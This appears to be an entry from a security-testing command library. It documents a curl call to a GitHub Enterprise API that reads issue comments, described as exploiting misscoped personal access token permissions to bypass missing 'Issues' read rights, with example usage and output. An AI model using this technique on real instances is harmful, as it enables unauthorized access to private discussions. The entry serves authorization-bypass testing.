---
data: >-
  curl -H "Authorization: token $TOKEN" -H "Accept:
  application/vnd.github.v3+json"
  https://github.enterprise.com/api/v3/repos/$REPO/issues/$ISSUE/comments
tags:
  - api
  - github
  - recon
type: command
executor: bash
platforms:
  - Web
  - Linux
  - macOS
  - Windows
id: e7d8ce14-054d-43ce-a3ab-d3ad2a57461c
created_at: '2025-12-14T17:30:07.266Z'
updated_at: '2025-12-14T17:30:07.266Z'
verified: false
validated: true
submitted: true
---
# github-api-query-issue-comments

## Command

```bash
curl -H "Authorization: token $TOKEN" -H "Accept: application/vnd.github.v3+json" https://github.enterprise.com/api/v3/repos/$REPO/issues/$ISSUE/comments
```

## Description

This command queries the GitHub Enterprise Server API to retrieve comments for a specific issue in a repository. It uses a Personal Access Token for authentication and exploits misscoped permissions to access data without 'Issues' read rights. Use it in scenarios involving authorization bypass testing on GitHub instances.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `$TOKEN` | Personal Access Token value (e.g., ghp_...) | Yes |
| `$REPO` | Repository path in format owner/repo | Yes |
| `$ISSUE` | Issue number (integer) | Yes |
| `-H` | Custom header for auth and content type | Yes |

## Examples

### Basic Usage

```bash
TOKEN=ghp_abc123 REPO=owner/test-repo ISSUE=123 curl -H "Authorization: token $TOKEN" -H "Accept: application/vnd.github.v3+json" https://github.enterprise.com/api/v3/repos/$REPO/issues/$ISSUE/comments
```

### Advanced Usage

```bash
TOKEN=ghp_abc123 REPO=owner/test-repo ISSUE=123 curl -H "Authorization: token $TOKEN" -H "Accept: application/vnd.github.v3+json" -s https://github.enterprise.com/api/v3/repos/$REPO/issues/$ISSUE/comments | jq '.[0].body'
```

(Add `-s` for silent output and pipe to jq for parsing the first comment body.)

## Expected Output

A JSON array of comment objects on success (HTTP 200), e.g.:

```json
[
  {
    "id": 1,
    "body": "Sensitive discussion here...",
    "user": {"login": "user"},
    "created_at": "2023-09-28T00:00:00Z"
  }
]
```

Errors: 401 (invalid token), 403 (if permissions are properly enforced), 404 (issue not found).

## Related

- [[Related Procedure: Exploit-GitHub-PAT-Misscoping-for-Issue-Comment-Access]]
